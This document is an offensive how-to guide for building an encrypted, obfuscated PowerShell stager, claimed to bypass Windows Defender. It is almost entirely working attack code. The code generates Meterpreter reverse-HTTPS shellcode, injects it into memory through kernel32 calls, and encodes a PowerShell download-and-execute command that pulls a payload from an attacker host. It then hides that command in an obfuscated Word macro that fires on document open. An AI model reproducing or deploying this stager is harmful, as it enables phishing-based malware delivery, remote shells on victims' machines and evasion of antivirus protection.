# Encrypted and Obfuscated PowerShell Stager

## IMPORTANT: it was tested in lab machine and successfully bypass Windows Defender, but if AMSI protection is enabled then it could not work

### 1) Create shellcode

    # If something is not working consider using 32-bits payloads (windows/meterpreter/reverse_http)
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f ps1

### 2) Create PowerShell script

Insert here your shellcode and save the file as run.ps1, this is supposed to be loaded directly in memory, therefore not touching the disk and avoiding AV scanning

    $Kernel32 = @"
    using System;
    using System.Runtime.InteropServices;
    
    public class Kernel32 {
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
            uint flAllocationType, uint flProtect);
            
        [DllImport("kernel32", CharSet=CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
                uint dwCreationFlags, IntPtr lpThreadId);
                
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
            UInt32 dwMilliseconds);
    }
    "@
    
    Add-Type $Kernel32
    
    # INSERT SHELLCODE HERE
    [Byte[]] $buf = 0xfc,0x48,0x83,..,0x41,0x89,0xda,0xff
    
    $size = $buf.Length
    
    [IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
    
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
    
    $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
    [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")

### 3) Encrypt your PS Code

This script will transform the characters to their ASCII value and do a Caesar encryption

    $payload = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://[ATTACKER_IP]/[stager_filename].txt'))"
    
    [string]$output = ""
    
    $payload.ToCharArray() | %{
        [string]$thischar = [byte][char]$_ + 17
        if($thischar.Length -eq 1)
        {
            $thischar = [string]"00" + $thischar
            $output += $thischar
        }
        elseif($thischar.Length -eq 2)
        {
            $thischar = [string]"0" + $thischar
            $output += $thischar
        }
        elseif($thischar.Length -eq 3)
        {
            $output += $thischar
        }
    }
    $output | clip
    $output

### 4) Create Macro

Copy the contents from the above step to the payload part and save the file as a .docm

    Function Pears(Beets)
        Pears = Chr(Beets - 17)
    End Function
    
    Function Strawberries(Grapes)
        Strawberries = Left(Grapes, 3)
    End Function
    
    Function Almonds(Jelly)
        Almonds = Right(Jelly, Len(Jelly) - 3)
    End Function
    
    Function Nuts(Milk)
        Do
        Oatmilk = Oatmilk + Pears(Strawberries(Milk))
        Milk = Almonds(Milk)
        Loop While Len(Milk) > 0
        Nuts = Oatmilk
    End Function
    
    Function MyMacro()
        Dim Apples As String
        Dim Water As String
        
        // Payload resulting from previous step
        Apples = "1291281361042112211.............640633137133056058058"
        Water = Nuts(Apples)
        GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
    End Function
    
    Sub AutoOpen()
        Mymacro
    End Sub
